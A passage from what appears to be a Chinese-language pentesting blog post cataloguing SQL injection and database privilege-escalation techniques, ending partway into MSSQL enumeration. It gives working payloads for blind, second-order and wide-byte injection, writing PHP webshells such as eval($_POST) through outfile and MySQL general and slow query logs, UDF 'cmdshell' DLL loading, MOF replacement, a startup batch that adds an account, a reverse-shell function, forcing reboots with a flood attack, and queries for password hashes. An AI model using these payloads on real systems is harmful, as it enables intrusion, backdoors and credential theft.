</span></span><span class="line"><span class="cl">mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0);
</span></span><span class="line"><span class="cl">Query OK, 0 rows affected (5.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#update 更新数据内容
</span></span><span class="line"><span class="cl">mysql&gt; select * from admin;
</span></span><span class="line"><span class="cl">+------+----------+----------+
</span></span><span class="line"><span class="cl">| id   | username | password |
</span></span><span class="line"><span class="cl">+------+----------+----------+
</span></span><span class="line"><span class="cl">|    2 | 1        | admin    |
</span></span><span class="line"><span class="cl">|    2 | 1        | admin    |
</span></span><span class="line"><span class="cl">|    2 | 1        | admin    |
</span></span><span class="line"><span class="cl">|    2 | admin    | admin    |
</span></span><span class="line"><span class="cl">+------+----------+----------+
</span></span><span class="line"><span class="cl">4 rows in set (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; update admin set id=&#34;5&#34;+sleep(5)+&#34;&#34; where id=2;
</span></span><span class="line"><span class="cl">Query OK, 4 rows affected (20.00 sec)
</span></span><span class="line"><span class="cl">Rows matched: 4  Changed: 4  Warnings: 0
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="二次注入">二次注入</h2>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119175625531.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119175625531.png, http://image.xpshuai.cn/img/image-20220119175625531.png 1.5x, http://image.xpshuai.cn/img/image-20220119175625531.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119175625531.png"
    title="http://image.xpshuai.cn/img/image-20220119175625531.png"/></p>
<p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码，这样就不会带有单引号等。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; insert into admin (id,name,pass) values (&#39;3&#39;,0x61646d696e272d2d2b,&#39;11&#39;);
</span></span><span class="line"><span class="cl">Query OK, 1 row affected (0.00 sec)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; select * from admin;
</span></span><span class="line"><span class="cl">+----+-----------+-------+
</span></span><span class="line"><span class="cl">| id | name      | pass  |
</span></span><span class="line"><span class="cl">+----+-----------+-------+
</span></span><span class="line"><span class="cl">|  1 | admin     | admin |
</span></span><span class="line"><span class="cl">|  2 | admin&#39;111 | 11111 |
</span></span><span class="line"><span class="cl">|  3 | admin&#39;--+ | 11    |
</span></span><span class="line"><span class="cl">+----+-----------+-------+
</span></span><span class="line"><span class="cl">4 rows in set (0.00 sec)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="宽字节注入">宽字节注入</h2>
<p>宽字节注入：针对目标做了一定的防护，单引号转变为 <code>\'</code> , mysql 会将 <code>\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字，所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>-1%df<span class="s1">&#39; union select...
</span></span></span><span class="line"><span class="cl"><span class="s1">#没使用宽字节%27 -&gt; %5C%27
</span></span></span><span class="line"><span class="cl"><span class="s1">#使用宽字节%df%27 -&gt; %df%5c%27 -&gt; 運&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="文件操作">文件操作</h2>
<h3 id="读文件">读文件</h3>
<p>读文件前提：
1、用户权限足够高，尽量具有root权限。
2、secure_file_priv不为NULL</p>
<p>load_file()</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">insert into read2_tb<span class="o">(</span>word<span class="o">)</span> values <span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;D:/test.txt&#39;</span><span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># load_file( )函数支持网络路径。如果你可以将DLL复制到网络共享中，那么你就可以直接加载并将它写入磁盘。</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> load_file<span class="o">(</span><span class="s1">&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;</span><span class="o">)</span> into dumpfile <span class="s2">&#34;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>load data infile</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">load data infile <span class="s1">&#39;D:/test.txt&#39;</span> into table read2_tb<span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="写文件">写文件</h3>
<p>into outfile</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">select</span> * from read2_tb where <span class="nv">1</span><span class="o">=</span><span class="m">1</span> into outfile <span class="s1">&#39;D:/test2.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 写webshell</span>
</span></span><span class="line"><span class="cl"><span class="nv">id</span> <span class="o">=</span>-1 union <span class="k">select</span> 1,<span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span>,3,4 into outfile <span class="s1">&#39;c:\\1.php&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>into dumpfile</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"></code></pre></td></tr></table>
</div>
</div><h3 id="突破secure-file-priv通过数据库日志写shell">突破secure-file-priv(通过数据库日志写shell)</h3>
<p>5.5.53之前版本，默认情况下此变量（<code>secure-file-priv</code>）为空，允许使用mysql终端对secure_file_priv参数更新（不讨论windows环境安装情况）。
5.5.53及之后版本修改secure_file_priv值只能修改my.cnf配置文件（不讨论windows环境安装)。</p>
<p><strong>load_file:</strong></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119190821425.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119190821425.png, http://image.xpshuai.cn/img/image-20220119190821425.png 1.5x, http://image.xpshuai.cn/img/image-20220119190821425.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119190821425.png"
    title="http://image.xpshuai.cn/img/image-20220119190821425.png"/></p>
<p><strong>secure_file_priv:</strong></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119190851930.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119190851930.png, http://image.xpshuai.cn/img/image-20220119190851930.png 1.5x, http://image.xpshuai.cn/img/image-20220119190851930.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119190851930.png"
    title="http://image.xpshuai.cn/img/image-20220119190851930.png"/></p>
<p><strong>into outfile:</strong></p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119190916033.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119190916033.png, http://image.xpshuai.cn/img/image-20220119190916033.png 1.5x, http://image.xpshuai.cn/img/image-20220119190916033.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119190916033.png"
    title="http://image.xpshuai.cn/img/image-20220119190916033.png"/></p>
<h4 id="方法一general_log">方法一：general_log</h4>
<p>1.查看secure_file_priv值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show global variables like <span class="s1">&#39;%secure_file_priv%&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># show global variables like &#39;%secure%&#39;;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 此开关默认为NULL，即不允许导入导出</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 没有具体值时，表示不对mysqld 的导入|导出做限制</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.查询操作日志存放路径</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show variables like <span class="s1">&#39;general_log%&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 操作日志默认也是关闭的</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.首先打开操作日志记录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">general_log</span> <span class="o">=</span> <span class="s1">&#39;ON&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.设置操作记录日志路径</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># set global general_log_file=&#39;路径地址&#39;;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 选择网站的目录里面</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">general_log_file</span><span class="o">=</span><span class="s1">&#39;D:\\phpstudy\\PHPTutorial\\WWW\\xx.php&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">select</span> <span class="s1">&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.切记关闭</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">general_log</span> <span class="o">=</span> <span class="s1">&#39;off&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>7.访问webshell，后续操作</p>
<h4 id="方法二slow_query_log">方法二：slow_query_log</h4>
<p>慢查询日志，用来记录在MySQL中响应时间超过阀值的语句。开启之后默认阀值是10s，可以更改此时间。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">slow_query_log</span><span class="o">=</span>on<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">slow_query_log_file</span><span class="o">=</span><span class="s2">&#34;c:\\phpStudy\\PHPTutorial\\wWwW\\3.php&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">select</span> sleep<span class="o">(</span>15<span class="o">)</span>, <span class="s1">&#39;&lt;?php assert($_POST[ &#34;cmd&#34;]);?&gt;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">set</span> global <span class="nv">slow_query_log</span><span class="o">=</span>off
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="权限提升">权限提升</h2>
<p><strong>常见密码获取方式：</strong>
● 读取网站数据库配置文件（了解其命名规则及查找技巧）
sql, data, inc, config, conn, database, common, include等</p>
<p>● 读取数据库存储或备份文件（了解其数据库存储格式及对应内容）
位置：@@basedir/data/数据库名/表名.myd</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先得到数据库安装目录</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> @@basedir<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mysql/user.myd是用户表，存储了用户的账号密码</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># myd后缀的是数据表</span>
</span></span><span class="line"><span class="cl">xiaodi数据库名下的user信息 怎么写
</span></span><span class="line"><span class="cl">mysql/data/xiaodi/user.myd
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以下载它之后然后进行还原</p>
<h3 id="1udf导出提权重点">1.UDF导出提权(重点)</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 利用自定义执行函数导出dll文件进行命令执行</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> version<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> user<span class="o">()</span><span class="p">;</span>   <span class="c1"># 获取数据库用户</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> @@basedir<span class="p">;</span>  <span class="c1"># 安装目录</span>
</span></span><span class="line"><span class="cl">show variables like <span class="s1">&#39;%plugins%&#39;</span><span class="p">;</span>  <span class="c1"># 寻找mysql安装路径 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 手工创建或利用NTFS流创建 plugin目录(如下) </span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="s1">&#39;x&#39;</span> into dumpfile <span class="s1">&#39;......mysql/lib/plugin::INDEX_ALLOCATION&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Note：</span>
</span></span><span class="line"><span class="cl">1.mysql&lt;5.1 一般导出dll到目录c:/windows/system32
</span></span><span class="line"><span class="cl">2.mysql<span class="o">=</span>&gt;5.1 导出安装目录的/lib/plugin/   <span class="c1"># 默认不存在，需要创建</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 1.使用脚本(最下面资源MySQL.php)进行自定义函数导出为dll就行(可能会失败)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2.创建一个自定义函数与dll文件对应</span>
</span></span><span class="line"><span class="cl">create <span class="k">function</span> cmdshell returns string soname <span class="s1">&#39;moonudf.dll&#39;</span>  <span class="c1"># 创建叫cmdshell的函数</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3.执行命令</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> cmdshell<span class="o">(</span><span class="s1">&#39;命令&#39;</span><span class="o">)</span>	<span class="c1"># 就可以执行命令了</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4.添加账户密码，后续操作</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2mof加载提权">2.MOF加载提权</h3>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119190452993.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119190452993.png, http://image.xpshuai.cn/img/image-20220119190452993.png 1.5x, http://image.xpshuai.cn/img/image-20220119190452993.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119190452993.png"
    title="http://image.xpshuai.cn/img/image-20220119190452993.png"/></p>
<p>系统目录中的mof/目录下有mof文件，目录下面的文件会被系统调用执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 将mof上传至任意可读可写目录下</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 导出自定义mof文件到系统目录加载</span>
</span></span><span class="line"><span class="cl">c:/windows/system32/wbem/mof/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 然后使用sql语句将系统当中默认的nullevt.mof给替换为我们自定义恶意的mof文件。进而让系统执行我们这个恶意的mof文件</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 替换的sql语句：select load_file(&#39;D:\WWW\xx.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3启动项重启提权">3.启动项重启提权</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 启动项文件夹(开机或重启之后会自动加载的程序)</span>
</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartUp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#导出自定义bat或vbs到启动目录配合重启执行</span>
</span></span><span class="line"><span class="cl">将创建好的adduser.vbs或.bat文件<span class="o">(</span>内容如下<span class="o">)</span>进行服务器启动项写入，配合重启执行！
</span></span><span class="line"><span class="cl">@echo off
</span></span><span class="line"><span class="cl">net user xiaodi 123!@jqazQ /add
</span></span><span class="line"><span class="cl"><span class="c1"># 配合其他利用命令</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 怎么让服务器重启呢？</span>
</span></span><span class="line"><span class="cl">可以CC攻击流量过高, 对方服务器打不开时候，然后就会自动重启了
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="4反弹shell提权重点">4.反弹SHELL提权(重点)</h3>
<blockquote>
<p>用于UDF没有成功取得cmdshell和MOF提权都失败的情况(对方把一些拓展/配置禁用了)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#采用MYSQL反弹函数获取权限，不再调用命令执行类函数!</span>
</span></span><span class="line"><span class="cl"><span class="k">select</span> backshell<span class="o">(</span>ip, 端口<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 然后在自己机器上nc监听</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="5sqlmap提权">5.sqlmap提权</h3>
<h3 id="6利用msf提权">6.利用msf提权</h3>
<h1 id="sql-server注入">SQL Server注入</h1>
<h2 id="简介-1">简介</h2>
<p><strong>权限分析：</strong></p>
<ul>
<li>sa (最高权限，所有操作都可以做)</li>
<li>db （拥有者权限， 多个数据操作）</li>
<li>public （单个数据操作[可能只有某个数据库甚至没权限]）</li>
</ul>
<p>注释：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-- comment goes here
</span></span><span class="line"><span class="cl">/* comment goes here */
</span></span></code></pre></td></tr></table>
</div>
</div><p>常用查询：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查看用户</span>
</span></span><span class="line"><span class="cl">SELECT CURRENT_USER
</span></span><span class="line"><span class="cl">SELECT user_name<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT system_user<span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT user<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 数据库版本</span>
</span></span><span class="line"><span class="cl">SELECT @@version
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 数据库名</span>
</span></span><span class="line"><span class="cl">SELECT DB_NAME<span class="o">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#列数据库</span>
</span></span><span class="line"><span class="cl">SELECT name FROM master..sysdatabases<span class="p">;</span>
</span></span><span class="line"><span class="cl">SELECT DB_NAME<span class="o">(</span>N<span class="o">)</span><span class="p">;</span> — <span class="k">for</span> <span class="nv">N</span> <span class="o">=</span> 0, 1, 2, …
</span></span><span class="line"><span class="cl">SELECT STRING_AGG<span class="o">(</span>name, <span class="s1">&#39;, &#39;</span><span class="o">)</span> FROM master..sysdatabases<span class="p">;</span> -- Change delimeter value such as <span class="s1">&#39;, &#39;</span> to anything <span class="k">else</span> you <span class="nv">want</span> <span class="o">=</span>&gt; master, tempdb, model, msdb   <span class="o">(</span>Only works in MSSQL 2017+<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列表</span>
</span></span><span class="line"><span class="cl">SELECT name FROM master..sysobjects WHERE <span class="nv">xtype</span> <span class="o">=</span> ‘U’<span class="p">;</span> — use <span class="nv">xtype</span> <span class="o">=</span> ‘V’ <span class="k">for</span> views
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT name FROM someotherdb..sysobjects WHERE <span class="nv">xtype</span> <span class="o">=</span> ‘U’<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT master..syscolumns.name, TYPE_NAME<span class="o">(</span>master..syscolumns.xtype<span class="o">)</span> FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id<span class="o">=</span>master..sysobjects.id AND master..sysobjects.name<span class="o">=</span>’sometable’<span class="p">;</span> — list colum names and types <span class="k">for</span> master..sometable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT table_catalog, table_name FROM information_schema.columns
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT STRING_AGG<span class="o">(</span>name, <span class="s1">&#39;, &#39;</span><span class="o">)</span> FROM master..sysobjects WHERE <span class="nv">xtype</span> <span class="o">=</span> <span class="s1">&#39;U&#39;</span><span class="p">;</span> -- Change delimeter value such as <span class="s1">&#39;, &#39;</span> to anything <span class="k">else</span> you <span class="nv">want</span> <span class="o">=</span>&gt; trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  <span class="o">(</span>Only works in MSSQL 2017+<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 列列</span>
</span></span><span class="line"><span class="cl">SELECT name FROM syscolumns WHERE <span class="nv">id</span> <span class="o">=</span> <span class="o">(</span>SELECT id FROM sysobjects WHERE <span class="nv">name</span> <span class="o">=</span> ‘mytable’<span class="o">)</span><span class="p">;</span> — <span class="k">for</span> the current DB only
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT master..syscolumns.name, TYPE_NAME<span class="o">(</span>master..syscolumns.xtype<span class="o">)</span> FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id<span class="o">=</span>master..sysobjects.id AND master..sysobjects.name<span class="o">=</span>’sometable’<span class="p">;</span> — list colum names and types <span class="k">for</span> master..sometable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SELECT table_catalog, column_name FROM information_schema.columns
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 提取用户名密码</span>
</span></span><span class="line"><span class="cl"><span class="c1">#MSSQL 2000:</span>
</span></span><span class="line"><span class="cl">SELECT name, password FROM master..sysxlogins
